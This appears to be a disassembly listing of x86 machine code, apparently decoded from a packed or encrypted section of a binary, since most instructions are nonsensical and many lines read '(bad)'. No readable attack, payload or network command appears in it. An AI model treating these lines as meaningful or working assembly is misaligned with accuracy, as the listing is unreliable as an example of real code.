  42110c:	xor    DWORD PTR [ecx-0x1a],ebx
  42110f:	adc    al,ah
  421111:	pushf  
  421112:	jne    0x421103
  421114:	test   eax,0x19fbebd
  421119:	inc    eax
  42111a:	mov    ecx,0x5d509cb9
  42111f:	pop    esi
  421120:	xor    al,0x30
  421123:	(bad)  
  421124:	fdiv   QWORD PTR [edi+0x63b51a7d]
  42112a:	stos   DWORD PTR es:[edi],eax
  42112b:	xor    ch,BYTE PTR [ebp+0x2d]
  42112e:	xor    BYTE PTR es:[esi+esi*8-0x5c],dh
  421133:	mov    edx,0xcfd663c8
  421138:	mov    ss,eax
  42113a:	or     BYTE PTR [eax-0x24],dh
  42113d:	(bad)  
  42113e:	pop    esp
  42113f:	shl    BYTE PTR [ebp+eiz*1+0x15118db5],0xd9
  421147:	test   BYTE PTR [ebx+edi*4-0x72668b00],ah
  42114e:	jp     0x421132
  421150:	jb     0x4211ac
  421152:	mov    bh,0xf6
  421154:	sbb    DWORD PTR [ebp-0x3053577a],esp
  42115a:	push   edx
  42115b:	add    dh,ah
  42115d:	and    bh,BYTE PTR [edi-0x7b436ed5]
  421163:	dec    ebx
  421164:	add    bl,bh
  421166:	mov    ds:0x7a36d213,al
  42116b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42116c:	aaa    
  42116d:	test   esi,esp
  42116f:	xchg   edi,ecx
  421171:	jo     0x4211e0
  421173:	sahf   
  421174:	jno    0x4211aa
  421176:	les    esi,FWORD PTR [ebx]
  421178:	shl    BYTE PTR [edx-0x7d06640d],cl
  42117e:	jle    0x421160
  421180:	push   0x42
  421182:	sub    BYTE PTR [edx+0xc],bh
  421185:	push   es
  421186:	mov    ecx,DWORD PTR [ebp-0x7a]
  421189:	push   0xfc1cffc8
  42118e:	sub    cl,BYTE PTR [ebx+ebp*1-0x2d]
  421192:	daa    
  421193:	out    dx,eax
  421194:	(bad)  
  421195:	retf   0xba89
  421198:	hlt    
  421199:	ds inc ecx
  42119b:	loop   0x4211b9
  42119d:	and    dl,ah
  42119f:	lods   al,BYTE PTR ds:[esi]
  4211a0:	sbb    bl,BYTE PTR [edi-0x4483c7f2]
  4211a6:	xor    DWORD PTR [ebp+esi*4-0x70],esi
  4211aa:	or     edi,DWORD PTR [esi-0x29]
  4211ad:	cmp    cl,BYTE PTR [esi+0xe38f1fe]
  4211b3:	out    dx,eax
  4211b4:	(bad)  
  4211b5:	push   0x44
  4211b7:	in     al,dx
  4211b8:	ins    BYTE PTR es:[edi],dx
  4211b9:	sub    DWORD PTR [edx],0x39214fe9
  4211bf:	fs inc eax
  4211c1:	fsub   st,st(7)
  4211c3:	jns    0x4211cd
  4211c5:	mov    ch,0x32
  4211c7:	es and eax,0x5ead6ec1
  4211cd:	scas   al,BYTE PTR es:[edi]
  4211ce:	gs mov ch,0xdc
  4211d1:	rol    edx,0xc
  4211d4:	mov    eax,ds:0x2763518
  4211d9:	add    eax,0x1d193356
  4211de:	and    DWORD PTR [ecx],edi
  4211e0:	mov    ebp,DWORD PTR [eax]
  4211e2:	jbe    0x42123c
  4211e4:	jg     0x4211e3
  4211e6:	or     esp,DWORD PTR cs:0x2e8329b1
  4211ed:	mov    ds:0x579b67b7,al
  4211f2:	cli    
  4211f3:	loope  0x421226
  4211f5:	sbb    al,0x54
  4211f7:	jne    0x421272
  4211f9:	jo     0x421191
  4211fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211fc:	aam    0x4
  4211fe:	xor    eax,0x2beeb369
  421203:	popf   
  421204:	fist   WORD PTR [edx]
  421206:	dec    ebp
  421207:	inc    ecx
  421208:	xchg   BYTE PTR [bp+si],ch
  42120b:	inc    ebx
  42120c:	iret   
  42120d:	jo     0x42118f
  42120f:	mov    esi,edi
  421211:	sbb    al,0xca
  421213:	call   DWORD PTR [ecx]
  421215:	xor    edi,DWORD PTR [edi]
  421217:	adc    edi,0xfffffff9
  42121a:	and    eax,0xa9841174
  42121f:	mov    fs,WORD PTR [esi+edi*4]
  421222:	sub    bh,ch
  421224:	test   al,0x44
  421226:	icebp  
  421227:	in     eax,0x20
  421229:	xor    eax,0x11b26914
  42122e:	mov    eax,ds:0xa49e3901
  421233:	cmp    eax,0xae091fc0
  421238:	ret    0x1524
  42123b:	mov    dl,0xfd
  42123d:	push   esi
  42123e:	pop    esi
  42123f:	rcr    DWORD PTR [esi],0xcf
  421242:	mov    edx,0xe4f8af05
  421247:	jnp    0x4212ac
  421249:	xor    eax,0xad035c60
  42124e:	xchg   esi,eax
  42124f:	icebp  
  421250:	rcr    bh,cl
  421252:	mov    edx,0x8511c3ac
  421257:	add    BYTE PTR [ebp+ebx*2-0x53],0x0
  42125c:	sub    DWORD PTR [ebx],ebx
  42125e:	popw   ds
  421260:	or     al,0xa9
  421262:	dec    esi
  421263:	(bad)  
  421265:	dec    esp
  421266:	jl     0x421207
  421268:	addr16 cdq 
  42126a:	fs jp  0x4212af
  42126d:	sub    DWORD PTR [eax+0x28cb4837],ecx
  421273:	jle    0x421288
  421275:	adc    BYTE PTR [ebx-0x6842d85b],cl
  42127b:	xchg   DWORD PTR [ebp-0x5a],esp
  42127e:	std    
  42127f:	xor    ebp,DWORD PTR [edx]
  421281:	ins    BYTE PTR es:[edi],dx
  421282:	sbb    esp,0x19
  421285:	add    DWORD PTR [esi-0x71171302],esp
  42128b:	ss inc edx
  42128d:	lea    edi,[esi-0x5afa0bec]
  421293:	out    0xd1,al
  421295:	jo     0x421284
  421297:	xor    BYTE PTR [esi],bl
  421299:	hlt    
  42129a:	fsubr  QWORD PTR [edi+0x11]
  42129d:	cmp    eax,0x840dff84
  4212a2:	push   eax
  4212a3:	sbb    bl,bh
  4212a5:	xchg   esp,eax
  4212a6:	fs ret 0xff2a
  4212aa:	cld    
  4212ab:	jae    0x42125a
  4212ad:	sbb    DWORD PTR cs:[eax+0x31],edx
  4212b1:	sbb    BYTE PTR [edi+0x4a],cl
  4212b4:	retf   0x54af
  4212b7:	pop    eax
  4212b8:	mov    esi,0x9ae7a1e2
  4212bd:	add    DWORD PTR [eax+0x1ba632e1],esp
  4212c3:	loop   0x4212a4
  4212c5:	mov    BYTE PTR [ebp+0x47a80910],0xfc
  4212cc:	pop    ss
  4212cd:	mov    ebx,0xb43c101f
  4212d2:	add    esp,DWORD PTR [edi+0x7b]
  4212d5:	fmulp  st(6),st
  4212d7:	shl    BYTE PTR [ebp-0x20],1
  4212da:	xchg   ecx,eax
  4212db:	clc    
  4212dc:	lods   al,BYTE PTR ds:[esi]
  4212dd:	lock retf 
  4212df:	mov    edi,0x9b7687bc
  4212e4:	test   al,0xc6
  4212e6:	icebp  
  4212e7:	adc    al,0x3b
  4212e9:	sub    DWORD PTR [ebp-0x21],ebx
  4212ec:	rol    DWORD PTR [ecx+0x5e1847f6],cl
  4212f2:	int3   
  4212f3:	data16 aad 0x58
  4212f6:	adc    esp,edx
  4212f8:	xchg   esp,eax
  4212f9:	retf   0x57ab
  4212fc:	jbe    0x42130d
  4212fe:	jne    0x421350
  421300:	ret    
  421301:	or     ebp,ecx
  421303:	push   ds
  421304:	ret    
  421305:	popa   
  421306:	repnz lahf 
  421308:	lahf   
  421309:	dec    ecx
  42130a:	mov    bh,BYTE PTR [edi-0x3e643242]
  421310:	retf   0x2155
  421313:	lods   eax,DWORD PTR ds:[esi]
  421314:	loop   0x42133a
  421316:	addr16 bt ebp,edx
  42131a:	lahf   
  42131b:	outs   dx,BYTE PTR ds:[esi]
  42131c:	lea    ebp,[edi+0x3574e590]
  421322:	test   BYTE PTR [esi-0x62],dl
  421325:	aaa    
  421326:	repnz mov bl,BYTE PTR [edx+0x222f6dc5]
  42132d:	jge    0x42135a
  42132f:	sar    edi,0x53
  421332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421333:	aaa    
  421334:	xchg   edi,eax
  421335:	or     BYTE PTR [edi-0x131a8ad4],dh
  42133b:	(bad)  
  42133c:	mov    dl,0x3d
  42133e:	sub    BYTE PTR [ebp-0x4],cl
  421341:	(bad)  
  421342:	mov    dl,0x58
  421344:	(bad)  
  421345:	and    DWORD PTR [edi+0x2e],ebx
  421348:	xor    ebp,DWORD PTR [edi+ecx*2+0x606be1f6]
  42134f:	jns    0x4213cd
  421351:	adc    al,0x71
  421353:	mov    esp,ebx
  421355:	iret   
  421356:	and    esi,DWORD PTR [esi]
  421358:	or     eax,0x990d62f0
  42135d:	test   eax,0xe8b5b89b
  421362:	sub    ch,BYTE PTR [edi]
  421364:	imul   DWORD PTR [edi+0x6e]
  421367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421368:	mov    edx,0x41aa35fb
  42136d:	xor    DWORD PTR [esi-0x184bedfe],ebp
  421373:	xchg   ebp,eax
  421374:	mov    al,ds:0x74ea573c
  421379:	fwait
  42137a:	and    eax,0xc2941b90
  42137f:	and    al,BYTE PTR [ecx+0x75639c6b]
  421385:	jbe    0x421401
  421387:	imul   ebp,edi,0xffffff92
  42138a:	imul   ebp,DWORD PTR [ebx+0x46e5754f],0x4167185f
  421394:	aas    
  421395:	push   ds
  421396:	icebp  
  421397:	aam    0x72
  421399:	rcl    BYTE PTR [eax],0xbe
  42139c:	sbb    dl,BYTE PTR fs:[edi*1+0x54151ba4]
  4213a4:	stos   BYTE PTR es:[edi],al
  4213a5:	mov    bh,0x11
  4213a7:	fistp  DWORD PTR [ecx]
  4213a9:	aam    0x96
  4213ab:	stos   DWORD PTR es:[edi],eax
  4213ac:	cwde   
  4213ad:	mov    al,BYTE PTR [esi]
  4213af:	lods   al,BYTE PTR ds:[esi]
  4213b0:	int3   
  4213b1:	xor    BYTE PTR [edi+ebx*4-0x5d0b3346],0x8e
  4213b9:	dec    edx
  4213ba:	xor    al,0xd6
  4213bc:	add    eax,0xf6b1631
  4213c1:	pop    ebx
  4213c2:	iret   
  4213c3:	sbb    bh,BYTE PTR [eax+0x47550499]
  4213c9:	enter  0xbd69,0x87
  4213cd:	mov    cl,0xea
  4213cf:	clc    
  4213d0:	xor    al,0x9c
  4213d2:	dec    ebp
  4213d3:	hlt    
  4213d4:	jge    0x421385
  4213d6:	mov    cl,0x50
  4213d8:	or     ecx,ecx
  4213da:	lea    ebx,[eax]
  4213dc:	data16 mov es,WORD PTR [eax-0x3c879cd2]
  4213e3:	test   eax,0xe9eec
  4213e8:	pop    ebp
  4213e9:	pop    es
  4213ea:	das    
  4213eb:	int3   
  4213ec:	test   ch,bl
  4213ee:	mov    edi,DWORD PTR fs:[ebx-0x70cd4a4d]
  4213f5:	jnp    0xc42c6ac0
  4213fb:	xor    ch,BYTE PTR [eax]
  4213fd:	int    0x93
  4213ff:	dec    eax
  421400:	xlat   BYTE PTR ds:[ebx]
  421401:	pop    edi
  421402:	jp     0x421428
  421404:	sub    BYTE PTR [ecx],dl
  421406:	xchg   edx,eax
  421407:	out    dx,eax
  421408:	sahf   
  421409:	adc    eax,0x8e0db5b9
  42140e:	jge    0x421420
  421410:	sub    DWORD PTR [esi],esp
  421412:	std    
  421413:	push   es
  421414:	pop    ds
  421415:	or     al,0xe3
  421417:	sub    al,bl
  421419:	xor    eax,0x6b8efa36
  42141e:	cmp    esi,DWORD PTR [edx+0x2b]
  421421:	pop    edi
  421422:	mov    cl,0x25
  421424:	test   esi,ebx
  421426:	hlt    
  421427:	call   0xd4b1c39e
  42142c:	mov    ah,0x6e
  42142e:	sbb    dl,BYTE PTR [eax-0x362eb23f]
  421434:	fbstp  TBYTE PTR [ecx]
  421436:	out    0x91,eax
  421438:	into   
  421439:	jne    0x421442
  42143b:	adc    eax,0x6ac7928c
  421440:	mov    cl,0x1e
  421442:	adc    al,0x49
  421444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421445:	mov    ecx,0x8410d096
  42144a:	cmp    DWORD PTR [ebp+eax*4-0x3d18839a],ebp
  421451:	mov    ah,0xcd
  421453:	or     BYTE PTR [ebx-0x61851a52],al
  421459:	dec    edx
  42145a:	jmp    0x8164:0xf763916
  421461:	xchg   edi,eax
  421462:	adc    al,0xfe
  421464:	test   BYTE PTR [edx-0x70a32ab7],0x76
  42146b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42146c:	cmp    BYTE PTR [edi],0xd7
  42146f:	mov    edx,DWORD PTR [ebp+0x7e]
  421472:	inc    ecx
  421473:	cmc    
  421474:	xchg   ebx,eax
  421475:	ja     0xe832d791
  42147b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42147c:	fdivr  DWORD PTR [edi+0x7a]
  42147f:	push   edx
  421480:	xor    BYTE PTR [ebx+eiz*1],bl
  421483:	mov    bl,0xb0
  421485:	mov    esi,DWORD PTR [edx-0x36]
  421488:	cdq    
  421489:	ret    0x848
  42148c:	aaa    
  42148d:	mov    ds:0x794f676c,al
  421492:	adc    DWORD PTR [esi],edi
  421494:	jns    0x4214ec
  421496:	shl    BYTE PTR [edi-0x57],1
  421499:	pop    edi
  42149a:	inc    esp
  42149b:	icebp  
  42149c:	cmp    al,0xd7
  42149e:	mov    ch,0x9
  4214a1:	pop    ds
  4214a2:	bound  edi,QWORD PTR [ebp+0x21]
  4214a5:	or     edx,DWORD PTR [esi]
  4214a7:	push   ss
  4214a8:	pusha  
  4214a9:	pop    es
  4214aa:	(bad)  
  4214ab:	fild   QWORD PTR ds:0x20f6bf6b
  4214b1:	cli    
  4214b2:	lea    esi,[edx]
  4214b4:	xchg   edi,eax
  4214b5:	push   edi
  4214b6:	add    BYTE PTR [esi],bl
  4214b8:	lods   al,BYTE PTR ds:[esi]
  4214b9:	aaa    
  4214ba:	rdpmc  
  4214bc:	adc    DWORD PTR [eax+0x4b5301ea],edx
  4214c2:	aaa    
  4214c3:	pop    eax
  4214c4:	dec    edi
  4214c5:	iret   
  4214c6:	sbb    eax,0xe6a82088
  4214cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214cc:	int3   
  4214cd:	dec    ecx
  4214ce:	enter  0xcb7,0x11
  4214d2:	and    DWORD PTR [ebx+0x73],0x5e
  4214d6:	mov    ah,0x7b
  4214d8:	mov    eax,ds:0x9395139b
  4214dd:	mov    BYTE PTR [eax-0x2d93a77e],al
  4214e3:	add    edx,DWORD PTR [esi]
  4214e5:	xor    DWORD PTR [edx],edi
  4214e7:	cmc    
  4214e8:	mov    edi,0x35325740
  4214ed:	pop    ss
  4214ee:	adc    DWORD PTR [ecx+eax*1-0x408170b1],eax
  4214f5:	dec    ebx
  4214f6:	neg    BYTE PTR [eax-0x67]
  4214f9:	pop    es
  4214fa:	loope  0x4214fa
  4214fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214fd:	rol    BYTE PTR [ebp+0x79d44551],1
  421503:	xor    al,0x5c
  421505:	clc    
  421506:	and    al,0x22
  421508:	sub    cl,bl
  42150a:	lods   eax,DWORD PTR ds:[esi]
  42150b:	repz loop 0x4214f9
  42150e:	fstp   DWORD PTR ds:0xe0ad2978
  421514:	adc    edi,DWORD PTR [esi+0x2f038218]
  42151a:	test   al,0xf8
  42151c:	fimul  WORD PTR [ebx+0x1907ea78]
  421522:	jl     0x42152c
  421524:	ins    DWORD PTR es:[edi],dx
  421525:	mov    ebp,0xaac2a812
  42152a:	dec    esi
  42152b:	aaa    
  42152c:	rol    DWORD PTR [ecx],1
  42152e:	cmp    ebx,ebp
  421530:	push   ecx
  421531:	mov    ch,0x36
  421533:	add    dh,bl
  421535:	pop    ss
  421536:	adc    BYTE PTR [eax-0x7b646ced],al
  42153c:	loop   0x421543
  42153e:	das    
  42153f:	sbb    edx,ebp
  421541:	xor    al,0x3f
  421543:	(bad)  
  421544:	push   ebx
  421545:	ins    BYTE PTR es:[edi],dx
  421546:	inc    ecx
  421547:	clc    
  421548:	retf   
  421549:	gs in  al,0x7
  42154c:	dec    ebp
  42154d:	mov    bl,0xcd
  42154f:	push   es
  421550:	jne    0x42153f
  421552:	fstp   QWORD PTR [ebx]
  421554:	faddp  st(6),st
  421556:	(bad)  
  421557:	imul   edi,DWORD PTR [edi-0x2b],0xc78e74ae
  42155e:	cmp    ecx,esi
  421560:	cld    
  421561:	dec    ebx
  421562:	rol    dl,0xf2
  421565:	loopne 0x4215d6
  421567:	shr    DWORD PTR [ecx-0x8c8c4df],1
  42156d:	dec    edi
  42156e:	sub    al,0x2e
  421570:	daa    
  421571:	mov    al,ds:0xbef3cc67
  421576:	test   BYTE PTR [ecx+0xa],0xe5
  42157a:	jecxz  0x4215c7
  42157c:	jne    0x421554
  42157e:	daa    
  42157f:	dec    edi
  421580:	test   al,0xcc
  421582:	mov    BYTE PTR [eax-0x2b],al
  421585:	pop    ebp
  421586:	cs inc ecx
  421588:	bound  ecx,QWORD PTR [edx-0x706b2a26]
  42158e:	mov    esp,DWORD PTR [ecx+eiz*8-0x3f]
  421592:	pop    esp
  421593:	mov    ah,0x34
  421595:	repz std 
  421597:	mov    ds:0x618d6e9a,eax
  42159c:	dec    eax
  42159d:	bound  esp,QWORD PTR [ebp+0x5b615c02]
  4215a3:	jmp    0x421578
  4215a5:	ss and al,0x66
  4215a8:	and    BYTE PTR [edx+0x2b],al
  4215ab:	push   ds
  4215ac:	ds pop ss
  4215ae:	xor    al,BYTE PTR [ecx+0xf]
  4215b1:	jg     0x4215e1
  4215b3:	data16 cli 
  4215b5:	lahf   
  4215b6:	mov    ah,0x5f
  4215b8:	lock cmp esi,ecx
  4215bb:	pop    ecx
  4215bc:	xchg   esp,eax
  4215bd:	jae    0x421602
  4215bf:	loop   0x42161a
  4215c1:	sar    al,cl
  4215c3:	adc    BYTE PTR [ecx],0x42
  4215c6:	mov    esp,0x5e7d91a4
  4215cb:	sub    ebp,DWORD PTR [eax]
  4215cd:	adc    ebp,DWORD PTR ds:0x73c17dd4
  4215d3:	adc    DWORD PTR [edx],0x7b
  4215d6:	jp     0x42156c
  4215d8:	dec    eax
  4215d9:	adc    eax,0xa5a03909
  4215de:	mov    cs,eax
  4215e0:	dec    esp
  4215e1:	outs   dx,BYTE PTR ds:[esi]
  4215e2:	xchg   esp,eax
  4215e3:	pop    ds
  4215e4:	dec    ecx
  4215e5:	fisubr DWORD PTR ds:0xb5547338
  4215eb:	mov    edx,0xee1f721d
  4215f0:	add    al,0x14
  4215f2:	dec    ebx
  4215f3:	fisttp WORD PTR [edi-0x301c27c7]
  4215f9:	fsubr  DWORD PTR [edx+0x30]
  4215fc:	mov    al,ds:0x583513d7
  421601:	mov    dl,0x6a
  421603:	adc    ch,cl
  421605:	xchg   esi,eax
  421606:	cmp    eax,0xda930f7d
  42160b:	or     eax,0x4caadcdd
  421610:	pop    esp
  421611:	cli    
  421612:	mul    bl
  421614:	retf   0xabb6
  421617:	adc    BYTE PTR [eax],al
  421619:	jb     0x421662
  42161b:	jecxz  0x421603
  42161d:	xchg   esp,eax
  42161e:	xor    al,0xc4
  421620:	call   0xce4601e3
  421625:	(bad)  
  421626:	ss int3 
  421628:	push   es
  421629:	mov    al,0xc8
  42162b:	lea    ecx,[ebx+0x527f3b3c]
  421631:	test   eax,0x101a1ef8
  421636:	xor    eax,0xa18a32b1
  42163b:	out    0x3d,eax
  42163d:	or     DWORD PTR [ecx],eax
  42163f:	adc    bl,ch
  421641:	adc    eax,ebp
  421643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421644:	mov    ebp,0x30b9a87d
  421649:	push   cs
  42164a:	xor    BYTE PTR [ecx+0x41ff7c23],al
  421650:	cmp    BYTE PTR [esi-0x2550c9db],bl
  421656:	fldcw  WORD PTR [esi]
  421658:	jne    0x421619
  42165a:	fstp   DWORD PTR [esi+0x275c0c03]
  421660:	push   edi
  421661:	jmp    DWORD PTR [edi]
  421663:	sub    bh,BYTE PTR [edx]
  421665:	jne    0x421628
  421667:	sub    al,0x62
  421669:	mov    ebp,0xfadae6a1
  42166e:	jl     0x42168c
  421670:	shl    DWORD PTR [eax+esi*4],cl
  421673:	sub    DWORD PTR [edx],eax
  421675:	pop    eax
  421676:	mov    edx,0xcd26fc5b
  42167b:	in     al,dx
  42167c:	fcomip st,st(1)
  42167e:	leave  
  42167f:	inc    esi
  421680:	ds xchg ebp,eax
  421682:	sub    cl,BYTE PTR [edi]
  421684:	es int 0xb8
  421687:	xor    al,0x65
  421689:	(bad)  
  42168a:	js     0x42164f
  42168c:	pop    ebx
  42168d:	push   ss
  42168e:	(bad)  
  42168f:	xor    ebx,DWORD PTR [ecx-0x21]
  421692:	ins    DWORD PTR es:[edi],dx
  421693:	sub    DWORD PTR [edx+0x2b],0xd3581556
  42169a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42169b:	jne    0x4216ab
  42169d:	test   BYTE PTR cs:[edx],al
  4216a0:	cli    
  4216a1:	in     eax,dx
  4216a2:	mov    dl,BYTE PTR [edx+edx*8+0x269aafaa]
  4216a9:	push   0x336fcc84
  4216ae:	and    cl,BYTE PTR [ebp-0x4a4c711c]
  4216b4:	dec    edx
  4216b5:	fdivr  st(3),st
  4216b7:	sbb    eax,0xd68aebe2
  4216bc:	xchg   edi,eax
  4216bd:	mov    eax,ds:0x78006480
  4216c2:	jl     0x4216cf
  4216c4:	mov    ebp,0xb9da205a
  4216c9:	xchg   ebp,eax
  4216ca:	pop    eax
  4216cb:	xchg   edi,eax
  4216cc:	(bad)
  4216cf:	aas    
  4216d0:	leave  
  4216d1:	popa   
  4216d2:	ret    0xad14
  4216d5:	push   es
  4216d6:	cld    
  4216d7:	push   0xffffffd8
  4216d9:	mov    bl,0xc7
  4216db:	jnp    0x421741
  4216dd:	(bad)  
  4216de:	or     DWORD PTR [edi+0x3a6a4ca0],edx
  4216e4:	popf   
  4216e5:	push   ds
  4216e6:	cmc    
  4216e7:	mov    bh,0xa2
  4216e9:	loop   0x4216c2
  4216eb:	ficomp DWORD PTR [ebx+0xb22e300]
  4216f1:	fld    DWORD PTR [edi-0x2856cc63]
  4216f7:	dec    edx
  4216f8:	push   cs
  4216f9:	(bad)  
  4216fa:	adc    ebp,DWORD PTR [ebp+ebp*1+0x3d]
  4216fe:	ja     0x4216f0
  421700:	neg    DWORD PTR [ebx-0x4d]
  421703:	outs   dx,BYTE PTR ds:[esi]
  421704:	sub    esp,ecx
  421706:	jae    0x42176e
  421708:	stc    
  421709:	fidivr WORD PTR ds:0xc214e6d1
  42170f:	pop    eax
  421710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421711:	rcl    ebx,cl
  421713:	add    BYTE PTR [ebx-0x5b62c4a],bl
  421719:	pxor   mm4,QWORD PTR [edi+0x42]
  42171d:	push   ebx
  42171e:	repnz dec ebx
  421720:	enter  0x5178,0x1
  421724:	dec    eax
  421725:	repnz in eax,dx
  421727:	xor    ebx,esp
  421729:	in     al,0x19
  42172b:	(bad)  
  42172c:	clc    
  42172d:	pop    edi
  42172e:	mov    ch,0xe2
  421730:	and    BYTE PTR [edx-0xf],dl
  421733:	sub    eax,0x5abe56f
  421738:	fst    QWORD PTR [ecx-0x73]
  42173b:	xlat   BYTE PTR ds:[ebx]
  42173c:	arpl   dx,cx
  42173e:	ret    0x7ebb
  421741:	jo     0x421738
  421743:	aad    0x2c
  421745:	pop    edx
  421746:	pop    esi
  421747:	sub    esp,DWORD PTR [ebx-0x15]
  42174a:	out    dx,al
  42174b:	jmp    0x42174a
  42174d:	loope  0x4216d7
  42174f:	sub    DWORD PTR [edi-0x195b3add],esi
  421755:	test   eax,0x37678b19
  42175a:	pop    esp
  42175b:	mov    ds:0xaa02dd26,eax
  421760:	retf   
  421761:	fisttp QWORD PTR [edi+ecx*2+0x51]
  421765:	adc    ecx,esi
  421767:	outs   dx,DWORD PTR ds:[esi]
  421768:	dec    ecx
  421769:	sbb    eax,0x777442eb
  42176e:	fdiv   QWORD PTR [ebx+0x6fba505e]
  421774:	ss pop esi
  421776:	ins    DWORD PTR es:[edi],dx
  421777:	sub    al,0x46
  421779:	xchg   ecx,eax
  42177a:	xchg   bl,dl
  42177c:	into   
  42177d:	sbb    DWORD PTR [esi],edx
  42177f:	jno    0x421750
  421781:	sbb    al,0x1c
  421783:	repnz mov eax,0xf6a65697
  421789:	sub    DWORD PTR [ecx+eiz*1-0x31],0x2208e9ca
  421791:	sar    ah,0x6b
  421794:	jg     0x421796
	...
  4217aa:	push   edi
  4217ab:	pop    edx
  4217ac:	dec    edx
  4217ad:	inc    esi
  4217ae:	dec    edi
  4217af:	push   esi
  4217b0:	pop    edi
  4217b1:	pop    ebx
  4217b2:	push   esp
  4217b3:	inc    eax
  4217b4:	cmp    eax,0x94b2bb5
  4217b9:	int3   
  4217ba:	inc    edx
  4217bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217bc:	add    DWORD PTR [eax],eax
  4217be:	rol    DWORD PTR [esi],cl
  4217c0:	add    BYTE PTR [eax],al
  4217c2:	(bad)  
  4217c3:	jmp    0x421838
  4217c5:	clc    
  4217c6:	mov    eax,0x45286f01
  4217cb:	jmp    0x421817
  4217cd:	cwde   
  4217ce:	lods   al,BYTE PTR ds:[esi]
  4217cf:	xchg   edi,eax
  4217d0:	sub    eax,0x96a497c4
  4217d5:	iret   
  4217d6:	sbb    DWORD PTR [eax-0x4a],0x43
  4217da:	mov    BYTE PTR [edi],ah
  4217dc:	mov    edi,0x57a63c6a
  4217e1:	stos   BYTE PTR es:[edi],al
  4217e2:	fcom   QWORD PTR [ecx-0x23e8fe0a]
  4217e8:	or     eax,0x46e9927b
  4217ed:	cmp    BYTE PTR [edx+edx*8-0x5b384705],dh
  4217f4:	lea    esp,[ecx]
  4217f6:	pop    ss
  4217f7:	inc    esi
  4217f8:	or     eax,0x557a3d31
  4217fd:	fidiv  WORD PTR [edi]
  4217ff:	arpl   WORD PTR [edx],sp
  421801:	xor    al,0xf7
  421803:	cmp    al,BYTE PTR [ebx+edi*4+0x6a]
  421807:	(bad)  
  421808:	mov    edx,0xeee02524
  42180d:	and    esi,DWORD PTR [esi+0x61]
  421810:	mov    ebx,ebp
  421812:	inc    esi
  421813:	leave  
  421814:	mov    eax,ds:0x200cf501
  421819:	scas   al,BYTE PTR es:[edi]
  42181a:	shl    esp,1
  42181c:	dec    ebp
  42181d:	pop    ds
  42181e:	pop    ebp
  42181f:	dec    esi
  421820:	xor    DWORD PTR [edx+0x3f31d726],esp
  421826:	sbb    bh,BYTE PTR [ebx]
  421828:	shl    DWORD PTR [edi-0x70f93fc6],cl
  42182e:	jns    0x4217d0
  421830:	push   edx
  421831:	and    al,0x6c
  421833:	pop    es
  421834:	xchg   edx,eax
  421835:	popa   
  421836:	dec    eax
  421837:	jmp    0x8f5c:0x50f35a60
  42183e:	pop    eax
  42183f:	adc    ch,BYTE PTR ds:0xf43bf054
  421845:	fnstcw WORD PTR [ecx+0x75]
  421848:	sub    ebx,esi
  42184a:	or     BYTE PTR ds:0xb12fdd82,0x56
  421851:	inc    esp
  421852:	addr16 jb 0x42185e
  421855:	dec    esi
  421856:	sub    BYTE PTR [eax],al
  421858:	inc    ecx
  421859:	dec    edi
  42185a:	lahf   
  42185b:	push   edx
  42185c:	ja     0x421846
  42185e:	mov    WORD PTR [edx+0x6a],cs
  421861:	cmp    al,0x6c
  421863:	out    dx,eax
  421864:	jle    0x421823
  421866:	call   0x930a:0x277d746d
  42186d:	or     al,BYTE PTR cs:[ebp-0x2532c333]
  421874:	mov    edx,0xd543cea3
  421879:	iret   
  42187a:	adc    al,0x5a
  42187c:	sbb    eax,0xf323470a
  421881:	sub    eax,0x7b554f97
  421886:	ret    
  421887:	cdq    
  421888:	cmp    edx,ecx
  42188a:	fmul   DWORD PTR [edx]
  42188c:	in     al,0xa7
  42188e:	inc    ebp
  42188f:	ins    BYTE PTR es:[edi],dx
  421890:	retf   0x397e
  421893:	jmp    0x94d0:0x8a45281a
  42189a:	ds jb  0x4218b3
  42189d:	leave  
  42189e:	pusha  
  42189f:	jge    0x4218cc
  4218a1:	cld    
  4218a2:	adc    BYTE PTR [esp+ebp*8],cl
  4218a5:	push   ds
  4218a6:	repz and BYTE PTR [edi],cl
  4218a9:	adc    al,0x96
  4218ab:	pop    ds
  4218ac:	jp     0x421904
  4218ae:	(bad)  
  4218af:	stos   BYTE PTR es:[edi],al
  4218b0:	adc    DWORD PTR [ebx-0x667a807c],edi
  4218b6:	mov    esp,0xb2854f86
  4218bb:	and    DWORD PTR [esi+0x537bb68a],0xffffffc4
  4218c2:	xchg   bh,cl
  4218c4:	fimul  WORD PTR [esi+0x310aff80]
  4218ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218cb:	and    ebp,DWORD PTR [esi-0x4660c469]
  4218d1:	fwait
  4218d2:	fs popf 
  4218d4:	pop    esp
  4218d5:	or     al,0x19
  4218d7:	mov    DWORD PTR [ecx-0x3a],ebp
  4218da:	icebp  
  4218db:	push   edi
  4218dc:	in     eax,0x5b
  4218de:	cmp    DWORD PTR [eax+0xd],edx
  4218e1:	nop
  4218e2:	ds and al,0xb2
  4218e5:	hlt    
  4218e6:	push   esp
  4218e7:	lds    ebp,FWORD PTR [edi-0x6357f880]
  4218ed:	push   ebx
  4218ee:	pushf  
  4218ef:	cli    
  4218f0:	xor    edi,DWORD PTR [edx-0x2049c5c9]
  4218f6:	(bad)  
  4218f7:	mov    eax,0x5d0b61cd
  4218fc:	jmp    0x4218ec
  4218fe:	(bad)  
  421900:	ds adc eax,0x58334648
  421906:	aam    0x6a
  421908:	fild   WORD PTR [esi-0x4a]
  42190b:	sahf   
  42190c:	sbb    DWORD PTR [esi],ebx
  42190e:	mov    bl,0x19
  421910:	cmp    DWORD PTR [edi],0xfffffff0
  421913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
